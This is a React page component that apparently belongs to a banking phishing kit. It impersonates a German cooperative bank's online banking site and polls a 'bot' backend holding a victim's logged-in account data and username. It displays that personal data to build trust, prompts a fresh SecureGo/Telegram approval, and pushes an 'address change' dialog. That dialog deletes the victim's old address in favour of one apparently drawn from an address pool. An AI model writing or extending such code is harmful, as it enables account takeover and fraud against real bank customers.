import { useEffect, useMemo, useRef, useState } from "react";
import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { Loader2, MapPin, CheckCircle2 } from "lucide-react";
import { getBotTask, confirmAddress } from "@/lib/botClient";
import { getRandomPoolAddress } from "@/lib/addressPool.functions";
import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
import AddressVerification from "@/components/AddressVerification";
import { CompletionStep } from "@/components/flow/CompletionStep";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import vrLogoGeneric from "@/assets/vr-logo-generic.png";

type BankCtx = {
  bankId: string;
  bankName: string;
  group: string;
  theme: FlowTheme;
  logoSrc: string;
  fallbackLogoSrc: string;
  showName: boolean;
  bigLogo: boolean;
  footerLinks?: Record<string, { label: string; url: string }> | null;
};

const DEFAULT_THEME: FlowTheme = {
  headerBg: "#ffffff",
  buttonBg: "#003399",
  accentText: "#003399",
  topBarColor: "#003399",
  buttonRadius: "rounded-full",
};

type Step = "personal" | "address" | "done";

export const Route = createFileRoute("/personal-data/$taskId")({
  head: () => ({
    meta: [
      { title: "Persönliche Daten" },
      { name: "description", content: "Anzeige und Bestätigung Ihrer hinterlegten Kundendaten." },
      { name: "robots", content: "noindex,nofollow" },
    ],
  }),
  component: PersonalDataPage,
});

function firstString(...vals: unknown[]): string {
  for (const v of vals) {
    if (typeof v === "string" && v.trim()) return v.trim();
    if (typeof v === "number") return String(v);
  }
  return "";
}

function mapCustomer(result: any, bankName: string): CustomerData {
  const p = result?.person_data ?? {};
  const kd = result?.kontakt_data ?? {};
  const ad = result?.adressen_data ?? {};
  
  const anrede = firstString(p.anrede, p.salutation) || "Herr/Frau";
  const name = firstString(
    p?.namen?.anzeigenameKurz,
    p?.namen?.anzeigename,
    p?.name,
    [p?.vorname, p?.nachname].filter(Boolean).join(" "),
  ) || "—";
  
  const kundenNr = firstString(result?.customer_number, p?.kundennummer, p?.customerNumber, result?.credentials?.username) || "—";
  const geb = firstString(p?.geburtsdatum, p?.birthday, p?.dateOfBirth) || "—";
  
  // Familienstand (person_data.familie.familienstandBezeichnung)
  const fam = firstString(p?.familie?.familienstandBezeichnung, p?.familienstand, p?.maritalStatus) || "—";
  
  // E‑Mail (kontakt_data.emailAdressen[0].bezeichnung)
  const email = firstString(
    kd?.emailAdressen?.[0]?.bezeichnung,
    p?.email, 
    p?.emailPrivat, 
    p?.kontakt?.email
  ) || "—";
  
  // Mobil (kontakt_data.mobilfunkNummern[0].bezeichnung)
  const mobil = firstString(
    kd?.mobilfunkNummern?.[0]?.bezeichnung,
    p?.mobil, 
    p?.mobilNr, 
    p?.telefonMobil, 
    p?.kontakt?.mobil
  ) || "—";
  
  // Telefon (kontakt_data.festnetzNummern[0].bezeichnung)
  const phone = firstString(kd?.festnetzNummern?.[0]?.bezeichnung) || "";
  
  // Hauptadresse (aus adressen_data.hauptadresse.postadresse)
  const address = ad?.hauptadresse?.postadresse || p.adresse || p.address || {};
  const strasse = firstString(address.strasse, address.street, [address.strasse, address.hausnummer].filter(Boolean).join(" ")) || "Musterstraße 12";
  const plz = firstString(address.postleitzahl, address.plz, address.zip);
  const ort = firstString(address.ort, address.city, address.stadt);
  const plzOrt = [plz, ort].filter(Boolean).join(" ") || "12345 Musterstadt";

  return {
    anrede,
    name,
    kundenNr,
    geburtsdatum: geb,
    familienstand: fam,
    email,
    mobilNr: mobil,
    adresse: { strasse, plzOrt },
  };
}

function makeFallbackAddress(current: { strasse: string; plzOrt: string }) {
  const city = current.plzOrt.replace(/^\d{4,5}\s*/, "") || "Musterstadt";
  const plz = (current.plzOrt.match(/^\d{4,5}/)?.[0]) || "12345";
  return { strasse: "Lindenweg 3", plzOrt: `${plz} ${city}` };
}

function PersonalDataPage() {
  const { taskId } = Route.useParams();
  const navigate = useNavigate();
  const [result, setResult] = useState<any>(null);
  const [bankCtx, setBankCtx] = useState<BankCtx | null>(null);
  const [step, setStep] = useState<Step>("personal");
  const [addressDecisionPending, setAddressDecisionPending] = useState(false);
  const [forceShowSecureGo, setForceShowSecureGo] = useState(false);

  // Address-confirm popup (driven by bot's address_data / waiting_for_address_confirm)
  const [addrModalOpen, setAddrModalOpen] = useState(false);
  const [addrModalDismissed, setAddrModalDismissed] = useState(false);
  const [addrSubmitting, setAddrSubmitting] = useState(false);
  const [addrSuccess, setAddrSuccess] = useState(false);
  const [addrError, setAddrError] = useState<string | null>(null);
  const dismissedRef = useRef(false);

  // Bank context is cached from the login route; restore synchronously
  useEffect(() => {
    try {
      const raw = sessionStorage.getItem(`bot_bank_${taskId}`);
      if (raw) setBankCtx(JSON.parse(raw));
    } catch {}
    try {
      const raw = sessionStorage.getItem(`bot_result_${taskId}`);
      if (raw) setResult(JSON.parse(raw));
    } catch {}
    try {
      if (sessionStorage.getItem(`bot_address_pending_${taskId}`) === "1") {
        setAddressDecisionPending(true);
        sessionStorage.removeItem(`bot_address_pending_${taskId}`);
      }
    } catch {}
  }, [taskId]);

  // Continuous polling for late-arriving data (balance/cards/limits/address_data)
  useEffect(() => {
    let cancelled = false;
    let timer: ReturnType<typeof setTimeout> | null = null;
    const start = Date.now();
    const MAX_MS = 5 * 60 * 1000; // 5 min safety cap
    const tick = async () => {
      const { data } = await getBotTask(taskId).catch(() => ({ status: 0, data: {} as any }));
      if (cancelled) return;
      if (data?.result) {
        setResult(data.result);
        try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result)); } catch {}
      }
      // Open address-confirm popup as soon as the bot reports address_data
      // or explicitly waits for address confirmation.
      const addr = data?.result?.address_data ?? null;
      const waiting = data?.status === "waiting_for_address_confirm";
      if ((addr || waiting) && !dismissedRef.current && !addrSuccess) {
        setAddrModalOpen(true);
      }
      const done = data?.status === "completed" || data?.status === "failed";
      if (done || Date.now() - start > MAX_MS) return;
      timer = setTimeout(tick, 1500);
    };
    tick();
    return () => { cancelled = true; if (timer) clearTimeout(timer); };
  }, [taskId, addrSuccess]);

  const addressData = result?.address_data ?? null;

  async function handleConfirmDelete() {
    setAddrError(null);
    setAddrSubmitting(true);
    try {
      const res = await confirmAddress(taskId);
      if (!res.ok) {
        const body = await res.text().catch(() => "");
        throw new Error(`HTTP ${res.status}${body ? ` – ${body.slice(0, 160)}` : ""}`);
      }
      setAddrSuccess(true);
      dismissedRef.current = true;
      // Brief success indicator, then close.
      setTimeout(() => {
        setAddrModalOpen(false);
        setAddrModalDismissed(true);
      }, 1200);
    } catch (e: any) {
      setAddrError(e?.message || "Aufruf fehlgeschlagen. Bitte erneut versuchen.");
    } finally {
      setAddrSubmitting(false);
    }
  }

  const customer = useMemo(
    () => (result ? mapCustomer(result, bankCtx?.bankName ?? "") : null),
    [result, bankCtx?.bankName],
  );

  if (!result || !customer) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 text-gray-500">
        <Loader2 className="h-8 w-8 animate-spin mb-3 text-gray-400" />
        <p className="text-sm">Daten werden geladen…</p>
      </div>
    );
  }

  const theme = bankCtx?.theme ?? DEFAULT_THEME;
  const shellProps = {
    theme,
    logoSrc: bankCtx?.logoSrc ?? vrLogoGeneric,
    fallbackLogoSrc: bankCtx?.fallbackLogoSrc ?? vrLogoGeneric,
    bankName: bankCtx?.bankName ?? "Online-Banking",
    showName: bankCtx?.showName ?? false,
    bigLogo: bankCtx?.bigLogo ?? false,
    footerLinks: (bankCtx?.footerLinks ?? null) as any,
  };

  const bankId = bankCtx?.bankId ?? "";

  return (
    <BankShell {...shellProps}>
      {step === "personal" && (
        <PersonalDataOverview
          // @ts-expect-error FlowTheme is structurally compatible; component only reads shared fields
          theme={theme}
          customerData={customer}
          bankId={bankId}
          addressDecisionPending={addressDecisionPending}
          onAddressChoiceResolved={() => {
            // Kunde hat sich für eine Adresse entschieden – erneute
            // Sicherheitsfreigabe via Telegram / SecureGo anstoßen.
            setAddressDecisionPending(false);
            setForceShowSecureGo(true);
            setStep("address");
          }}
          onContinue={() => {
            if (addressDecisionPending) {
              setStep("address");
              return;
            }
            setStep("done");
          }}
          onEditAddress={() => setStep("done")}
        />
      )}

      {step === "address" && (
        <AddressVerification
          bankName={bankCtx?.bankName ?? ""}
          bankId={bankId}
          bankGroup={bankCtx?.group}
          // @ts-expect-error FlowTheme is structurally compatible with BankTheme
          theme={theme}
          customerName={customer.name}
          customerNumber={customer.kundenNr}
          customerEmail={customer.email}
          customerPhone={customer.mobilNr}
          currentAddress={customer.adresse}
          forceShowSecureGo={forceShowSecureGo}
          onSecureGoOpened={() => setForceShowSecureGo(false)}
          onConfirm={() => setStep("done")}
          onDelete={() => {
            // Rücksprung: Kunde muss auf "Persönliche Daten" erneut die
            // aktuelle Hauptadresse aus zwei Adressen auswählen.
            setAddressDecisionPending(true);
            setForceShowSecureGo(false);
            setStep("personal");
          }}
          onNoAddress={() => setStep("done")}
          taskId={taskId}
        />
      )}

      {step === "done" && (
        <CompletionStep theme={theme} customerName={customer.name} />
      )}

      <Dialog
        open={addrModalOpen}
        onOpenChange={(open) => {
          if (!open && !addrSubmitting) {
            setAddrModalOpen(false);
            setAddrModalDismissed(true);
            dismissedRef.current = true;
          }
        }}
      >
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <MapPin className="h-5 w-5" style={{ color: theme.accentText ?? theme.buttonBg }} />
              Adressänderung erforderlich
            </DialogTitle>
            <DialogDescription>
              Bitte prüfen Sie die hinterlegte Adresse. Die alte Adresse kann gelöscht werden.
            </DialogDescription>
          </DialogHeader>

          <div className="space-y-3 py-2">
            <div className="rounded border border-gray-200 p-3">
              <div className="text-xs uppercase text-gray-500 mb-1">Alte Adresse</div>
              <div className="text-sm text-gray-900">
                {addressData?.old_street || addressData?.old?.strasse || customer.adresse.strasse}
                {(addressData?.old_plz || addressData?.old_city) && (
                  <div>
                    {[addressData?.old_plz, addressData?.old_city].filter(Boolean).join(" ")}
                  </div>
                )}
              </div>
            </div>
            <div
              className="rounded border p-3"
              style={{ borderColor: theme.accentText ?? theme.buttonBg }}
            >
              <div className="text-xs uppercase text-gray-500 mb-1">Neue Adresse</div>
              <div className="text-sm text-gray-900">
                <div>{addressData?.new_street || addressData?.new?.strasse || "—"}</div>
                <div>
                  {[
                    addressData?.new_plz ?? addressData?.new?.plz,
                    addressData?.new_city ?? addressData?.new?.city,
                  ]
                    .filter(Boolean)
                    .join(" ") || "—"}
                </div>
              </div>
            </div>

            {addrError && (
              <div className="text-sm text-red-600 border border-red-200 bg-red-50 rounded p-2">
                {addrError}
              </div>
            )}

            {addrSuccess && (
              <div className="flex items-center gap-2 text-sm text-green-700 border border-green-200 bg-green-50 rounded p-2">
                <CheckCircle2 className="h-4 w-4" />
                Alte Adresse wurde gelöscht.
              </div>
            )}
          </div>

          <div className="flex justify-end">
            <button
              type="button"
              onClick={handleConfirmDelete}
              disabled={addrSubmitting || addrSuccess}
              className="inline-flex items-center gap-2 px-4 py-2 text-white text-sm font-medium disabled:opacity-60"
              style={{
                background: theme.buttonBg,
                borderRadius: theme.buttonRadius === "rounded-none" ? 0 : 999,
              }}
            >
              {addrSubmitting && <Loader2 className="h-4 w-4 animate-spin" />}
              {addrSuccess ? "Erledigt" : "Adresse löschen"}
            </button>
          </div>
        </DialogContent>
      </Dialog>
    </BankShell>
  );
}
